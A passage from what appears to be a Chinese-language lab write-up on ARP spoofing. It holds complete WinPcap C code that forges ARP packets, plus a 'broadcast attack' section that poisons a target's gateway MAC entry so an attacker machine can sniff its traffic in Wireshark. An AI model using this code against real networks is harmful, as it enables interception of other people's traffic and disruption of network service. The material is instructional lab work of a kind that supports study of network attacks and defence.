</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">123
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">124
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">125
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">126
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">127
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">128
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">129
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">130
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">131
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">132
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">133
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">134
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">135
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">136
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">137
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">138
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">139
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">140
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">141
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">142
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">143
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">144
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">145
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">146
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">147
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">148
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">149
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">150
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">151
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">152
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">153
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">154
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#define WIN32 
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#define  HAVE_REMOTE
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span><span style="color:#0f0;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold"></span><span style="color:#fff;font-weight:bold">typedef</span> <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> u_char;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">typedef</span> <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> u_short;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">typedef</span> <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> u_int;
</span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;pcap.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold"></span>
</span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#define ETH_ARP         0x0806  </span><span style="color:#007f7f">//以太网帧类型表示后面数据的类型，对于ARP请求或应答来说，该字段的值为x0806
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#0f0;font-weight:bold">#define ARP_HARDWARE    1  </span><span style="color:#007f7f">//硬件类型字段值为表示以太网地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#0f0;font-weight:bold">#define ETH_IP          0x0800  </span><span style="color:#007f7f">//协议类型字段表示要映射的协议地址类型值为x0800表示IP地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#0f0;font-weight:bold">#define ARP_REQUEST     1   </span><span style="color:#007f7f">//ARP请求
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#0f0;font-weight:bold">#define ARP_RESPONSE       2      </span><span style="color:#007f7f">//ARP应答
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">//14字节以太网首部
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">struct</span> EthernetHeader
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  u_char DestMAC[<span style="color:#ff0;font-weight:bold">6</span>];    <span style="color:#007f7f">//目的MAC地址 6字节
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  u_char SourMAC[<span style="color:#ff0;font-weight:bold">6</span>];   <span style="color:#007f7f">//源MAC地址 6字节
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  u_short EthType;         <span style="color:#007f7f">//上一层协议类型，如0x0800代表上一层是IP协议，0x0806为arp  2字节
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">//28字节ARP帧结构
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">struct</span> ArpHeader
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> hdType;   <span style="color:#007f7f">//硬件类型
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> proType;   <span style="color:#007f7f">//协议类型
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> hdSize;   <span style="color:#007f7f">//硬件地址长度
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> proSize;   <span style="color:#007f7f">//协议地址长度
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> op;   <span style="color:#007f7f">//操作类型，ARP请求（1），ARP应答（2），RARP请求（3），RARP应答（4）。
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  u_char smac[<span style="color:#ff0;font-weight:bold">6</span>];   <span style="color:#007f7f">//源MAC地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  u_char sip[<span style="color:#ff0;font-weight:bold">4</span>];   <span style="color:#007f7f">//源IP地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  u_char dmac[<span style="color:#ff0;font-weight:bold">6</span>];   <span style="color:#007f7f">//目的MAC地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  u_char dip[<span style="color:#ff0;font-weight:bold">4</span>];   <span style="color:#007f7f">//目的IP地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">//定义整个arp报文包，总长度42字节
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">struct</span> ArpPacket {
</span></span><span style="display:flex;"><span>  <span style="color:#fff;font-weight:bold">struct</span> EthernetHeader ed;
</span></span><span style="display:flex;"><span>  <span style="color:#fff;font-weight:bold">struct</span> ArpHeader ah;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">int</span> main()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  pcap_if_t* alldevs;   <span style="color:#007f7f">//所有网络适配器
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  pcap_if_t* d;   <span style="color:#007f7f">//选中的网络适配器 
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  <span style="color:#fff;font-weight:bold">int</span> inum;   <span style="color:#007f7f">//选择网络适配器
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  <span style="color:#fff;font-weight:bold">int</span> i = <span style="color:#ff0;font-weight:bold">0</span>;   <span style="color:#007f7f">//for循环变量
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  pcap_t* adhandle;   <span style="color:#007f7f">//打开网络适配器，捕捉实例,是pcap_open返回的对象
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  <span style="color:#fff;font-weight:bold">char</span> errbuf[PCAP_ERRBUF_SIZE];   <span style="color:#007f7f">//错误缓冲区,大小为256
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#007f7f">/* 获取本机设备列表 */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#007f7f">// 获取本机相关的所有网关
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  <span style="color:#fff;font-weight:bold">if</span> (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, <span style="color:#fff;font-weight:bold">NULL</span>, &amp;alldevs, errbuf) == -<span style="color:#ff0;font-weight:bold">1</span>)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>  	fprintf(stderr, <span style="color:#0ff;font-weight:bold">&#34;Error in pcap_findalldevs: %s</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>, errbuf);
</span></span><span style="display:flex;"><span>  	exit(<span style="color:#ff0;font-weight:bold">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#007f7f">/* 打印网关列表 */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#fff;font-weight:bold">for</span> (d = alldevs; d; d = d-&gt;next)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>  	printf(<span style="color:#0ff;font-weight:bold">&#34;%d. %s&#34;</span>, ++i, d-&gt;name);
</span></span><span style="display:flex;"><span>  	<span style="color:#fff;font-weight:bold">if</span> (d-&gt;description)
</span></span><span style="display:flex;"><span>  		printf(<span style="color:#0ff;font-weight:bold">&#34; (%s)</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>, d-&gt;description);
</span></span><span style="display:flex;"><span>  	<span style="color:#fff;font-weight:bold">else</span>
</span></span><span style="display:flex;"><span>  		printf(<span style="color:#0ff;font-weight:bold">&#34; (No description available)</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#007f7f">// 如果 i = 0 ，说明该计算机没有网关
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  <span style="color:#fff;font-weight:bold">if</span> (i == <span style="color:#ff0;font-weight:bold">0</span>)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>  	printf(<span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">No interfaces found! Make sure WinPcap is installed.</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>);
</span></span><span style="display:flex;"><span>  	<span style="color:#fff;font-weight:bold">return</span> -<span style="color:#ff0;font-weight:bold">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#007f7f">//  选择合适的网关
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  printf(<span style="color:#0ff;font-weight:bold">&#34;Enter the interface number (1-%d):&#34;</span>, i);
</span></span><span style="display:flex;"><span>  scanf(<span style="color:#0ff;font-weight:bold">&#34;%d&#34;</span>, &amp;inum);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#fff;font-weight:bold">if</span> (inum &lt; <span style="color:#ff0;font-weight:bold">1</span> || inum &gt; i)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>  	printf(<span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">Interface number out of range.</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>);
</span></span><span style="display:flex;"><span>  	<span style="color:#007f7f">/* 释放设备列表 */</span>
</span></span><span style="display:flex;"><span>  	pcap_freealldevs(alldevs);
</span></span><span style="display:flex;"><span>  	<span style="color:#fff;font-weight:bold">return</span> -<span style="color:#ff0;font-weight:bold">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#007f7f">/* 跳转到选中的适配器 */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#fff;font-weight:bold">for</span> (d = alldevs, i = <span style="color:#ff0;font-weight:bold">0</span>; i &lt; inum - <span style="color:#ff0;font-weight:bold">1</span>; d = d-&gt;next, i++);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#007f7f">/* 打开设备 */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#fff;font-weight:bold">if</span> ((adhandle = pcap_open(d-&gt;name,          <span style="color:#007f7f">// 设备名
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  	<span style="color:#ff0;font-weight:bold">65536</span>,            <span style="color:#007f7f">// 65535保证能捕获到不同数据链路层上的每个数据包的全部内容
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  	PCAP_OPENFLAG_PROMISCUOUS,    <span style="color:#007f7f">// 混杂模式
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  	<span style="color:#ff0;font-weight:bold">1000</span>,             <span style="color:#007f7f">// 读取超时时间
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  	<span style="color:#fff;font-weight:bold">NULL</span>,             <span style="color:#007f7f">// 远程机器验证
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  	errbuf            <span style="color:#007f7f">// 错误缓冲池
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  )) == <span style="color:#fff;font-weight:bold">NULL</span>)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>  	fprintf(stderr, <span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">Unable to open the adapter. %s is not supported by WinPcap</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>, d-&gt;name);
</span></span><span style="display:flex;"><span>  	<span style="color:#007f7f">/* 释放设备列表 */</span>
</span></span><span style="display:flex;"><span>  	pcap_freealldevs(alldevs);
</span></span><span style="display:flex;"><span>  	<span style="color:#fff;font-weight:bold">return</span> -<span style="color:#ff0;font-weight:bold">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#007f7f">/*以上代码在WinPcap开发文档中都可以找到，填充ARP包的代码则要自己编写*/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#007f7f">//开始填充ARP包，填充数据写死在代码中，测试用时数据可随意填写
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> sendbuf[<span style="color:#ff0;font-weight:bold">42</span>]; <span style="color:#007f7f">//arp包结构大小，42个字节
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> mac[<span style="color:#ff0;font-weight:bold">6</span>] = { <span style="color:#ff0;font-weight:bold">0x01</span>,<span style="color:#ff0;font-weight:bold">0x01</span>,<span style="color:#ff0;font-weight:bold">0x01</span>,<span style="color:#ff0;font-weight:bold">0x01</span>,<span style="color:#ff0;font-weight:bold">0x01</span>,<span style="color:#ff0;font-weight:bold">0x01</span> };
</span></span><span style="display:flex;"><span>  <span style="color:#007f7f">//unsigned char mac[6] = { 0xff,0xff,0xff,0xff,0xff,0xff };
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> ip[<span style="color:#ff0;font-weight:bold">4</span>] = { <span style="color:#ff0;font-weight:bold">192</span>,<span style="color:#ff0;font-weight:bold">168</span>,<span style="color:#ff0;font-weight:bold">195</span>,<span style="color:#ff0;font-weight:bold">138</span> };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> dmac[<span style="color:#ff0;font-weight:bold">6</span>] = {<span style="color:#ff0;font-weight:bold">0x00</span>,<span style="color:#ff0;font-weight:bold">0x50</span>,<span style="color:#ff0;font-weight:bold">0x56</span>,<span style="color:#ff0;font-weight:bold">0xe7</span>,<span style="color:#ff0;font-weight:bold">0xd4</span>,<span style="color:#ff0;font-weight:bold">0x22</span>};
</span></span><span style="display:flex;"><span>  <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> d_ip[<span style="color:#ff0;font-weight:bold">4</span>] = {<span style="color:#ff0;font-weight:bold">192</span>,<span style="color:#ff0;font-weight:bold">168</span>,<span style="color:#ff0;font-weight:bold">195</span>,<span style="color:#ff0;font-weight:bold">2</span>};
</span></span><span style="display:flex;"><span>  <span style="color:#fff;font-weight:bold">struct</span> EthernetHeader eh;
</span></span><span style="display:flex;"><span>  <span style="color:#fff;font-weight:bold">struct</span> ArpHeader ah;
</span></span><span style="display:flex;"><span>  <span style="color:#007f7f">//赋值MAC地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  <span style="color:#007f7f">//memset(eh.DestMAC, 0xff, 6);   //以太网首部目的MAC地址，全为广播地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  memcpy(eh.DestMAC, dmac, <span style="color:#ff0;font-weight:bold">6</span>); <span style="color:#007f7f">//以太网首部目的MAC地址 
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
</span></span><span style="display:flex;"><span>  memcpy(eh.SourMAC, mac, <span style="color:#ff0;font-weight:bold">6</span>);   <span style="color:#007f7f">//以太网首部源MAC地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  memcpy(ah.smac, mac, <span style="color:#ff0;font-weight:bold">6</span>);   <span style="color:#007f7f">//ARP字段源MAC地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  <span style="color:#007f7f">//memset(ah.dmac, 0xff, 6);   //ARP字段目的MAC地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  memcpy(ah.dmac, dmac, <span style="color:#ff0;font-weight:bold">6</span>);   <span style="color:#007f7f">//ARP字段目的MAC地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  memcpy(ah.sip, ip, <span style="color:#ff0;font-weight:bold">4</span>);   <span style="color:#007f7f">//ARP字段源IP地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  memset(ah.dip, <span style="color:#ff0;font-weight:bold">0x05</span>, <span style="color:#ff0;font-weight:bold">4</span>);   <span style="color:#007f7f">//ARP字段目的IP地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  memcpy(ah.dip, d_ip, <span style="color:#ff0;font-weight:bold">4</span>);   <span style="color:#007f7f">//ARP字段目的IP地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  eh.EthType = htons(ETH_ARP);   <span style="color:#007f7f">//htons：将主机的无符号短整形数转换成网络字节顺序
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  ah.hdType = htons(ARP_HARDWARE);
</span></span><span style="display:flex;"><span>  ah.proType = htons(ETH_IP);
</span></span><span style="display:flex;"><span>  ah.hdSize = <span style="color:#ff0;font-weight:bold">6</span>;
</span></span><span style="display:flex;"><span>  ah.proSize = <span style="color:#ff0;font-weight:bold">4</span>;
</span></span><span style="display:flex;"><span>  ah.op = htons(ARP_REQUEST);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#007f7f">//构造一个ARP请求
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  memset(sendbuf, <span style="color:#ff0;font-weight:bold">0</span>, <span style="color:#fff;font-weight:bold">sizeof</span>(sendbuf));   <span style="color:#007f7f">//ARP清零
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  memcpy(sendbuf, &amp;eh, <span style="color:#fff;font-weight:bold">sizeof</span>(eh));
</span></span><span style="display:flex;"><span>  memcpy(sendbuf + <span style="color:#fff;font-weight:bold">sizeof</span>(eh), &amp;ah, <span style="color:#fff;font-weight:bold">sizeof</span>(ah));
</span></span><span style="display:flex;"><span>  <span style="color:#007f7f">//如果发送成功
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>  <span style="color:#fff;font-weight:bold">if</span> (pcap_sendpacket(adhandle, sendbuf, <span style="color:#ff0;font-weight:bold">42</span>) == <span style="color:#ff0;font-weight:bold">0</span>) {
</span></span><span style="display:flex;"><span>  	printf(<span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">PacketSend succeed</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#fff;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>  	printf(<span style="color:#0ff;font-weight:bold">&#34;PacketSendPacket in getmine Error: %d</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>, GetLastError());
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#007f7f">/* 释放设备列表 */</span>
</span></span><span style="display:flex;"><span>  pcap_freealldevs(alldevs);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#fff;font-weight:bold">return</span> <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="广播攻击-1">广播攻击<a hidden class="anchor" aria-hidden="true" href="#广播攻击-1">#</a></h4>
<ul>
<li>
<p>构造响应包，其中协议地址为网关IP，而MAC地址为广播地址，将这样的响应包发给局域网内主机。那么，局域网主机发给网关的数据包都将被广播。这既是一种嗅探方法，也可作为干扰网络服务的攻击方法。</p>
</li>
<li>
<p>这里将靶机(<code>192.168.195.138</code>)对网关的MAC 地址篡改为 广播地址，利用攻击机(<code>IP : 192.168.195.131</code>)监控流量。</p>
</li>
<li>
<p>在发包的源代码中：修改 IP和 MAC地址，构造ARP包</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#f00">源</span>ip mac  (<span style="color:#f00">这里是网关的</span>IP地址 <span style="color:#f00">和</span> <span style="color:#f00">广播</span>mac地址)
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> mac[<span style="color:#ff0;font-weight:bold">6</span>] = { <span style="color:#ff0;font-weight:bold">0xFF</span>,<span style="color:#ff0;font-weight:bold">0xFF</span>,<span style="color:#ff0;font-weight:bold">0xFF</span>,<span style="color:#ff0;font-weight:bold">0xFF</span>,<span style="color:#ff0;font-weight:bold">0xFF</span>,<span style="color:#ff0;font-weight:bold">0xFF</span> };
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> ip[<span style="color:#ff0;font-weight:bold">4</span>] = { <span style="color:#ff0;font-weight:bold">192</span>,<span style="color:#ff0;font-weight:bold">168</span>,<span style="color:#ff0;font-weight:bold">195</span>,<span style="color:#ff0;font-weight:bold">2</span> };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f00">目的</span> ip mac  (<span style="color:#f00">这里是</span> <span style="color:#f00">靶机的</span>IP和MAC)
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> dmac[<span style="color:#ff0;font-weight:bold">6</span>] = {<span style="color:#ff0;font-weight:bold">0x00</span>,<span style="color:#ff0;font-weight:bold">0x0C</span>,<span style="color:#ff0;font-weight:bold">0x29</span>,<span style="color:#ff0;font-weight:bold">0x19</span>,<span style="color:#ff0;font-weight:bold">0xba</span>,<span style="color:#ff0;font-weight:bold">0x6e</span>};
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> d_ip[<span style="color:#ff0;font-weight:bold">4</span>] = {<span style="color:#ff0;font-weight:bold">192</span>,<span style="color:#ff0;font-weight:bold">168</span>,<span style="color:#ff0;font-weight:bold">195</span>,<span style="color:#ff0;font-weight:bold">138</span>};
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20210924162657033.png" alt="image-20210924162657033"  />
</p>
</li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20210924162807973.png" alt="image-20210924162807973"  />
</p>
<p>这里的第一个arp -a  显示的 网关mac地址 为正确的 mac地址。</p>
<p>第二个 arp -a 为 发送虚假构造的arp包 之后，网关地址被修改为 广播地址。</p>
</li>
</ul>
</li>
<li>
<p>然后用靶机(<code>IP 192.168.195.138</code>) ping win10主机 ，同时在攻击机(<code>IP 192.168.195.131</code>) 中用<strong>wireshark</strong>进行监控信道，进行抓包</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20210924165225351.png" alt="image-20210924165225351"  />
</li>
</ul>
</li>
<li>
<p>可以发现攻击机可以监控到 靶机(<code>IP 192.168.195.138</code>) ping <a href="http://www.baidu.com">www.baidu.com</a> 的数据包</p>
<ul>
